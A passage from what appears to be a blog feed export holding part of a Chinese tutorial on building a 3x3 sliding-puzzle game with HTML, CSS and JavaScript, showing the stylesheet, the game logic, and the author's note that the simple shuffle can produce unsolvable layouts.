class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">* {</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* *是通配符，给所有的元素去掉默认样式，因为有的浏览器会默认加上一些样式，这可能会给布局带来问题 */</span></span><br><span class="line"><span class="selector-tag">body</span> {</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* 给body设置100%的高度和宽度，这样就会根据浏览器屏幕大小自动适配 */</span></span><br><span class="line"><span class="selector-id">#container</span> {</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">620px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">450px</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">1px</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* 这是包裹所有元素的DIV，给他设置620px的宽和450px的高，这个大小可以设置为更大，但是不能小，至少要能包含里面所有的元素 */</span></span><br><span class="line"><span class="selector-id">#game</span> {</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">450px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">450px</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#ffe171</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span> <span class="number">#ffe171</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* 这是游戏区的DIV，这个大小是计算出来的，取决于你的小方块的大小。这里我们设置小方块的大小为150px 150px，所以这个大小是150px*3，为450px */</span></span><br><span class="line"><span class="selector-id">#game</span> <span class="selector-tag">div</span> {</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">149px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">149px</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">1px</span> <span class="number">1px</span> <span class="number">2px</span> <span class="number">#777</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#20a6fa</span>;</span><br><span class="line">  <span class="attribute">color</span>: white;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">150px</span>;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">150px</span>;</span><br><span class="line">  <span class="attribute">cursor</span>: pointer;</span><br><span class="line">  -webkit-<span class="attribute">transition</span>: <span class="number">0.3s</span>; <span class="comment">/*浏览器前缀，兼容其他浏览器 chrome*/</span></span><br><span class="line">  -moz-<span class="attribute">transition</span>: <span class="number">0.3s</span>; <span class="comment">/*firefox*/</span></span><br><span class="line">  -ms-<span class="attribute">transition</span>: <span class="number">0.3s</span>; <span class="comment">/*ie*/</span></span><br><span class="line">  -o-<span class="attribute">transition</span>: <span class="number">0.3s</span>; <span class="comment">/*opera*/</span></span><br><span class="line">  <span class="attribute">transition</span>: <span class="number">0.3s</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* 这就是小方块的大小了，定位为绝对定位，这样改变位置不会影响其他元素的位置。宽高都是149px。注意了，我们还设置了box-shadow:1px 1px 2px #777 ；</span></span><br><span class="line"><span class="comment">它还有边框阴影，所以149px 加上边框1px，它的总宽度是150px 下面的transition：0.3s是设置过渡时间，这是css3的属性，它会让属性改变呈现过渡动画，所以</span></span><br><span class="line"><span class="comment">当我们改变方块的位置时，它会有一个动画，我们不必自己编写动画函数，这回让你疯狂*/</span></span><br><span class="line"><span class="selector-id">#game</span> <span class="selector-tag">div</span><span class="selector-pseudo">:hover</span> {</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#ffe171</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/*给方块设置鼠标悬停动画，当鼠标悬停在元素上面时，会用这里的属性替换上面的属性，移开后又会变为原来的，这里我们是把字体颜色改变*/</span></span><br><span class="line"><span class="selector-id">#control</span> {</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">150px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">450px</span>;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">float</span>: right;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/*控制区，display:inline-block会让元素呈现块状元素的特性，使得可以改变大小，同时也会具有行内元素的特性，使得不会占据一行空间，float:right让元素浮动到</span></span><br><span class="line"><span class="comment">右边*/</span></span><br><span class="line"><span class="selector-id">#control</span> rowspan {</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">25px</span>;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#222</span>;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">10px</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/*设置控制区按钮的共同样式*/</span></span><br><span class="line"><span class="selector-id">#start</span> {</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">28px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">28px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#20a6fa</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#ffe171</span>;</span><br><span class="line">  <span class="attribute">text-shadow</span>: <span class="number">1px</span> <span class="number">1px</span> <span class="number">2px</span> <span class="number">#ffe171</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">2px</span> <span class="number">2px</span> <span class="number">5px</span> <span class="number">#4c98f5</span>;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">cursor</span>: pointer;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/*给start按钮设置属性。cursor:pointer属性让鼠标移到元素上面时会显示不同的鼠标形状，pointer是手型*/</span></span><br><span class="line"><span class="selector-id">#reset</span> {</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">28px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">28px</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#20a6fa</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#ffe171</span>;</span><br><span class="line">  <span class="attribute">text-shadow</span>: <span class="number">1px</span> <span class="number">1px</span> <span class="number">2px</span> <span class="number">#ffe171</span>; <span class="comment">/*字体阴影*/</span></span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">5px</span>; <span class="comment">/*圆角属性*/</span></span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">2px</span> <span class="number">2px</span> <span class="number">5px</span> <span class="number">#4c98f5</span>; <span class="comment">/*盒子阴影*/</span></span><br><span class="line">  <span class="attribute">text-align</span>: center; <span class="comment">/*文字居中*/</span></span><br><span class="line">  <span class="attribute">cursor</span>: pointer;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/*给Reset按钮设置属性*/</span></span><br><span class="line"><span class="selector-id">#d1</span> {</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0px</span>;</span><br><span class="line">}</span><br><span class="line"><span class="selector-id">#d2</span> {</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">150px</span>;</span><br><span class="line">}</span><br><span class="line"><span class="selector-id">#d3</span> {</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">300px</span>;</span><br><span class="line">}</span><br><span class="line"><span class="selector-id">#d4</span> {</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">150px</span>;</span><br><span class="line">}</span><br><span class="line"><span class="selector-id">#d5</span> {</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">150px</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">150px</span>;</span><br><span class="line">}</span><br><span class="line"><span class="selector-id">#d6</span> {</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">150px</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">300px</span>;</span><br><span class="line">}</span><br><span class="line"><span class="selector-id">#d7</span> {</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">300px</span>;</span><br><span class="line">}</span><br><span class="line"><span class="selector-id">#d8</span> {</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">150px</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">300px</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/*这是预先给每个小方块按照顺序排好位置*/</span></span><br></pre></td></tr></tbody></table></figure><p>好了，样式也编写好了。最后再编写一个 js 控制代码，我们的拼图就可以用了。编写样式的时候大家还是先根据我这里的来，等完成了整个游戏，了解游戏逻辑的时候你们再自己发挥想象力去更改样式，不然可能会出现未知的错误。</p><p>完成这步，打开 <code>puzzle.html</code> 应该能看到下面的效果了：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/22493/puzzle1.png" alt="img"></p><h4 id="3-控制代码的编写"><a href="#3-控制代码的编写" class="headerlink" title="3.控制代码的编写"></a>3.控制代码的编写</h4><p><strong>puzzle.js</strong></p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> time = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//保存定时时间</span></span><br><span class="line"><span class="keyword">var</span> pause = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">//设置是否暂停标志，true表示暂停</span></span><br><span class="line"><span class="keyword">var</span> set_timer;</span><br><span class="line"><span class="comment">//设置定时函数</span></span><br><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">10</span>);</span><br><span class="line"><span class="comment">//保存大DIV当前装的小DIV的编号</span></span><br><span class="line"><span class="keyword">var</span> d_direct = <span class="keyword">new</span> <span class="title class_">Array</span>(</span><br><span class="line">  [<span class="number">0</span>], <span class="comment">//为了逻辑更简单，第一个元素我们不用，我们从下标1开始使用</span></span><br><span class="line">  [<span class="number">2</span>, <span class="number">4</span>], <span class="comment">//大DIV编号为1的DIV可以去的位置，比如第一块可以去2,4号位置</span></span><br><span class="line">  [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>],</span><br><span class="line">  [<span class="number">2</span>, <span class="number">6</span>],</span><br><span class="line">  [<span class="number">1</span>, <span class="number">5</span>, <span class="number">7</span>],</span><br><span class="line">  [<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>],</span><br><span class="line">  [<span class="number">3</span>, <span class="number">5</span>, <span class="number">9</span>],</span><br><span class="line">  [<span class="number">4</span>, <span class="number">8</span>],</span><br><span class="line">  [<span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>],</span><br><span class="line">  [<span class="number">6</span>, <span class="number">8</span>]</span><br><span class="line">);</span><br><span class="line"><span class="comment">//保存大DIV编号的可移动位置编号</span></span><br><span class="line"><span class="keyword">var</span> d_posXY = <span class="keyword">new</span> <span class="title class_">Array</span>(</span><br><span class="line">  [<span class="number">0</span>], <span class="comment">//同样，我们不使用第一个元素</span></span><br><span class="line">  [<span class="number">0</span>, <span class="number">0</span>], <span class="comment">//第一个表示left,第二个表示top，比如第一块的位置为let:0px,top:0px</span></span><br><span class="line">  [<span class="number">150</span>, <span class="number">0</span>],</span><br><span class="line">  [<span class="number">300</span>, <span class="number">0</span>],</span><br><span class="line">  [<span class="number">0</span>, <span class="number">150</span>],</span><br><span class="line">  [<span class="number">150</span>, <span class="number">150</span>],</span><br><span class="line">  [<span class="number">300</span>, <span class="number">150</span>],</span><br><span class="line">  [<span class="number">0</span>, <span class="number">300</span>],</span><br><span class="line">  [<span class="number">150</span>, <span class="number">300</span>],</span><br><span class="line">  [<span class="number">300</span>, <span class="number">300</span>]</span><br><span class="line">);</span><br><span class="line"><span class="comment">//大DIV编号的位置</span></span><br><span class="line">d[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">d[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">d[<span class="number">3</span>] = <span class="number">3</span>;</span><br><span class="line">d[<span class="number">4</span>] = <span class="number">4</span>;</span><br><span class="line">d[<span class="number">5</span>] = <span class="number">5</span>;</span><br><span class="line">d[<span class="number">6</span>] = <span class="number">6</span>;</span><br><span class="line">d[<span class="number">7</span>] = <span class="number">7</span>;</span><br><span class="line">d[<span class="number">8</span>] = <span class="number">8</span>;</span><br><span class="line">d[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//默认按照顺序排好，大DIV第九块没有，所以为0，我们用0表示空白块</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">move</span>(<span class="params">id</span>) {</span><br><span class="line">  <span class="comment">//移动函数，前面我们已将讲了</span></span><br><span class="line">  <span class="keyword">var</span> i = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">10</span>; ++i) {</span><br><span class="line">    <span class="keyword">if</span> (d[i] == id) <span class="keyword">break</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="comment">//这个for循环是找出小DIV在大DIV中的位置</span></span><br><span class="line">  <span class="keyword">var</span> target_d = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">//保存小DIV可以去的编号，0表示不能移动</span></span><br><span class="line">  target_d = <span class="title function_">whereCanTo</span>(i);</span><br><span class="line">  <span class="comment">//用来找出小DIV可以去的位置，如果返回0，表示不能移动，如果可以移动，则返回可以去的位置编号</span></span><br><span class="line">  <span class="keyword">if</span> (target_d != <span class="number">0</span>) {</span><br><span class="line">    d[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//把当前的大DIV编号设置为0，因为当前小DIV已经移走了，所以当前大DIV就没有装小DIV了</span></span><br><span class="line">    d[target_d] = id;</span><br><span class="line">    <span class="comment">//把目标大DIV设置为被点击的小DIV的编号</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'d'</span> + id).<span class="property">style</span>.<span class="property">left</span> = d_posXY[target_d][<span class="number">0</span>] + <span class="string">'px'</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'d'</span> + id).<span class="property">style</span>.<span class="property">top</span> = d_posXY[target_d][<span class="number">1</span>] + <span class="string">'px'</span>;</span><br><span class="line">    <span class="comment">//最后设置被点击的小DIV的位置，把它移到目标大DIV的位置</span></span><br><span class="line">  }</span><br><span class="line">  <span class="comment">//如果target_d不为0，则表示可以移动，且target_d就是小DIV要去的大DIV的位置编号</span></span><br><span class="line">  <span class="keyword">var</span> finish_flag = <span class="literal">true</span>;</span><br><span class="line">  <span class="comment">//设置游戏是否完成标志，true表示完成</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> k = <span class="number">1</span>; k &lt; <span class="number">9</span>; ++k) {</span><br><span class="line">    <span class="keyword">if</span> (d[k] != k) {</span><br><span class="line">      finish_flag = <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">      <span class="comment">//如果大DIV保存的编号和它本身的编号不同，则表示还不是全部按照顺序排的，那么设置为false，跳出循环，后面不用再判断了，因为只要一个不符，就没完成游戏</span></span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="comment">//从1开始，把每个大DIV保存的编号遍历一下，判断是否完成</span></span><br><span class="line">  <span class="keyword">if</span> (finish_flag == <span class="literal">true</span>) {</span><br><span class="line">    <span class="keyword">if</span> (!pause) <span class="title function_">start</span>();</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">'congratulation'</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="comment">//如果为true，则表示游戏完成，如果当前没有暂停，则调用暂停韩式，并且弹出提示框，完成游戏。</span></span><br><span class="line">  <span class="comment">//start()这个函数是开始，暂停一起的函数，如果暂停，调用后会开始，如果开始，则调用后会暂停</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">whereCanTo</span>(<span class="params">cur_div</span>) {</span><br><span class="line">  <span class="comment">//判断是否可移动函数，参数是大DIV的编号，不是小DIV的编号，因为小DIV编号跟可以去哪没关系，小DIV是会动的</span></span><br><span class="line">  <span class="keyword">var</span> j = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> move_flag = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; d_direct[cur_div].<span class="property">length</span>; ++j) {</span><br><span class="line">    <span class="comment">//把所有可能去的位置循环遍历一下</span></span><br><span class="line">    <span class="keyword">if</span> (d[d_direct[cur_div][j]] == <span class="number">0</span>) {</span><br><span class="line">      move_flag = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">//如果目标的值为0，说明目标位置没有装小DIV，则可以移动，跳出循环</span></span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> (move_flag == <span class="literal">true</span>) {</span><br><span class="line">    <span class="keyword">return</span> d_direct[cur_div][j];</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="comment">//可以移动，则返回目标位置的编号，否则返回0，表示不可移动</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//定时函数，每一秒执行一次</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">timer</span>(<span class="params"></span>) {</span><br><span class="line">  time += <span class="number">1</span>; <span class="comment">//一秒钟加一，单位是秒</span></span><br><span class="line">  <span class="keyword">var</span> min = <span class="built_in">parseInt</span>(time / <span class="number">60</span>); <span class="comment">//把秒转换为分钟，一分钟60秒，取商就是分钟</span></span><br><span class="line">  <span class="keyword">var</span> sec = time % <span class="number">60</span>; <span class="comment">//取余就是秒</span></span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'timer'</span>).<span class="property">innerHTML</span> = min + <span class="string">'分'</span> + sec + <span class="string">'秒'</span>; <span class="comment">//然后把时间更新显示出来</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//开始暂停函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">start</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">if</span> (pause) {</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'start'</span>).<span class="property">innerHTML</span> = <span class="string">'暂停'</span>; <span class="comment">//把按钮文字设置为暂停</span></span><br><span class="line">    pause = <span class="literal">false</span>; <span class="comment">//暂停表示设置为false</span></span><br><span class="line">    set_timer = <span class="built_in">setInterval</span>(timer, <span class="number">1000</span>); <span class="comment">//启动定时</span></span><br><span class="line">    <span class="comment">//如果当前是暂停，则开始</span></span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'start'</span>).<span class="property">innerHTML</span> = <span class="string">'开始'</span>;</span><br><span class="line">    pause = <span class="literal">true</span>;</span><br><span class="line">    <span class="built_in">clearInterval</span>(set_timer);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//重置函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">reset</span>(<span class="params"></span>) {</span><br><span class="line">  time = <span class="number">0</span>; <span class="comment">//把时间设置为0</span></span><br><span class="line">  <span class="title function_">random_d</span>(); <span class="comment">//把方块随机打乱函数</span></span><br><span class="line">  <span class="keyword">if</span> (pause)</span><br><span class="line">    <span class="comment">//如果暂停，则开始计时</span></span><br><span class="line">    <span class="title function_">start</span>();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//随机打乱方块函数，我们的思路是从第九块开始，随机生成一个数，然后他们两块对调一下</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">random_d</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">9</span>; i &gt; <span class="number">1</span>; --i) {</span><br><span class="line">    <span class="keyword">var</span> to = <span class="built_in">parseInt</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * (i - <span class="number">1</span>) + <span class="number">1</span>); <span class="comment">//产生随机数，范围为1到i，不能超出范围，因为没这个id的DIV</span></span><br><span class="line">    <span class="keyword">if</span> (d[i] != <span class="number">0</span>) {</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'d'</span> + d[i]).<span class="property">style</span>.<span class="property">left</span> = d_posXY[to][<span class="number">0</span>] + <span class="string">'px'</span>;</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'d'</span> + d[i]).<span class="property">style</span>.<span class="property">top</span> = d_posXY[to][<span class="number">1</span>] + <span class="string">'px'</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">//把当前的DIV位置设置为随机产生的DIV的位置</span></span><br><span class="line">    <span class="keyword">if</span> (d[to] != <span class="number">0</span>) {</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'d'</span> + d[to]).<span class="property">style</span>.<span class="property">left</span> = d_posXY[i][<span class="number">0</span>] + <span class="string">'px'</span>;</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'d'</span> + d[to]).<span class="property">style</span>.<span class="property">top</span> = d_posXY[i][<span class="number">1</span>] + <span class="string">'px'</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">//把随机产生的DIV的位置设置为当前的DIV的位置</span></span><br><span class="line">    <span class="keyword">var</span> tem = d[to];</span><br><span class="line">    d[to] = d[i];</span><br><span class="line">    d[i] = tem;</span><br><span class="line">    <span class="comment">//然后把它们两个的DIV保存的编号对调一下</span></span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化函数，页面加载的时候调用重置函数，重新开始</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">  <span class="title function_">reset</span>();</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>好了，所有代码都已经编写完成了。现在点击桌面上的 <code>puzzle.html</code> 文件，使用 浏览器 打开，就能看到效果了。点击上面的方块就可以移动。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过此项目，我们利用 HTML5 + CSS3 + JavaScript，实现了一个简单的拼图游戏。</p><p>这里说明一下，因为实验中使用的随机打乱方块的算法非常简单，但是存在 bug，有 50% 的概率生成的顺序是无法复原的，这个时候就只能点击重新开始。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>删除Win10此电脑里的设备和驱动器中的图标</title>
      <link href="/posts/39253/"/>
      <url>/posts/39253/</url>
      
